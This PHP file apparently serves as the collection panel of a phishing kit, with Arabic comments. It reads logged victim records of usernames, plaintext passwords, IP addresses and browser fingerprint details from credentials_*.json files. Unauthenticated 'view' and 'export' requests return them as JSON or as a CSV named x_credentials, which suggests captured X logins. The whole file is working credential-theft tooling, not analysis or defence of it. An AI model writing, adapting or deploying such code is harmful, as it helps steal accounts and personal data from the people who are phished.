<?php
error_reporting(0);
ini_set('display_errors', 0);

class CredentialManager {
    private $logs_dir = 'logs';
    
    public function __construct() {
        if (!is_dir($this->logs_dir)) {
            mkdir($this->logs_dir, 0755, true);
        }
    }
    
    public function getAllCredentials() {
        $credentials = [];
        $files = glob($this->logs_dir . '/credentials_*.json');
        
        foreach ($files as $file) {
            $content = file_get_contents($file);
            // تحويل إلى مصفوفة من JSON objects
            $lines = explode(",\n", $content);
            foreach ($lines as $line) {
                $line = trim($line);
                if (!empty($line) && $line !== '[' && $line !== ']') {
                    $data = json_decode($line, true);
                    if ($data) {
                        $credentials[] = $data;
                    }
                }
            }
        }
        
        return array_reverse($credentials);
    }
    
    public function exportToCSV() {
        $credentials = $this->getAllCredentials();
        
        // رؤوس CSV
        $csv = "Timestamp,Username,Password,IP Address,User Agent,Language,Platform,Screen Resolution,Timezone\n";
        
        foreach ($credentials as $cred) {
            $csv .= sprintf(
                '"%s","%s","%s","%s","%s","%s","%s","%s","%s"' . "\n",
                $cred['timestamp'],
                $cred['username'],
                $cred['password'],
                $cred['ip_address'],
                $cred['user_agent'],
                $cred['language'],
                $cred['platform_info'],
                $cred['screen_resolution'],
                $cred['timezone']
            );
        }
        
        return $csv;
    }
}

// معالجة الطلبات
if (isset($_GET['action'])) {
    $manager = new CredentialManager();
    
    switch ($_GET['action']) {
        case 'view':
            header('Content-Type: application/json');
            echo json_encode($manager->getAllCredentials(), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
            break;
            
        case 'export':
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="x_credentials_' . date('Y-m-d') . '.csv"');
            echo $manager->exportToCSV();
            break;
            
        default:
            http_response_code(400);
            echo 'Action not supported';
    }
    exit();
}
?>
